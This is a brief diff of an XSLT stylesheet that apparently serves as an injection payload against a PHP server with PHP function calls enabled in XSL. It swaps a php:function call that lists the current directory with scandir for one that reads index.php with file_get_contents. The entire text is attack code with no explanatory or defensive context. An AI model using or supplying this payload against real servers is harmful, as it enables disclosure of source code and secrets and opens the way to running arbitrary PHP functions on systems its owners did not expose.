@@ -4,7 +4,7 @@
     xmlns:php="http://php.net/xsl">
   <xsl:template match="/">
     <pre>
-<xsl:value-of select="php:function('json_encode', php:function('scandir', '.'))"/>
+<xsl:value-of select="php:function('file_get_contents', 'index.php')" />
     </pre>
   </xsl:template>
 </xsl:stylesheet>
